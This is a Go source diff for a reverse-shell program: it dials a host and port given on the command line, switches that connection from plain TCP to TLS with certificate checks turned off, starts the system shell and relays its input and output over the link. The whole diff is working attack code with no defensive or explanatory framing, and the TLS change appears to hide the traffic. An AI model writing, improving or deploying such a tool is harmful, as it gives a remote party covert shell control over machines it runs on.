@@ -2,8 +2,9 @@ package main
 
 import (
 	"fmt"
+	"crypto/tls"
 //	"log"
-	"net"
+//	"net"
 	"os"
 	"os/exec"
 	"io"
@@ -25,8 +26,13 @@ func main() {
 		fmt.Printf("Usage: %s <ip> <port>", os.Args[0])
 		os.Exit(1)
 	}
-	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", os.Args[1], os.Args[2]))
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+	conn, _ := tls.Dial("tcp", fmt.Sprintf("%s:%s", os.Args[1], os.Args[2]), conf)
 	shellPath := GetSystemShell()
+
+	conn.Write([]byte(shellPath + "\n"))
 
 	var cmd *exec.Cmd
 	cmd = exec.Command(shellPath)
@@ -35,14 +41,39 @@ func main() {
 	stdout, _ := cmd.StdoutPipe()
 	stderr, _ := cmd.StderrPipe()
 	
+	cmd.Start()
+	
 	go func() {
 		io.Copy(stdin, conn)
+		/*buf := make([]byte, 1024)
+		for {
+			n, err := conn.Read(buf)
+			if err != nil {
+				break
+			}
+			stdin.Write(buf[:n])
+		}*/
 	}()
 	
 	go func() {
 		io.Copy(conn, stdout)
+		/*buf := make([]byte, 1024)
+		for {
+			n, err := stdout.Read(buf)
+			if err != nil {
+				break
+			}
+			conn.Write(buf[:n])
+		}*/
 	}()
 	
-	cmd.Start()
 	io.Copy(conn, stderr)
+	/*buf := make([]byte, 1024)
+	for {
+		n, err := stderr.Read(buf)
+		if err != nil {
+			break
+		}
+		conn.Write(buf[:n])
+	}*/
 }
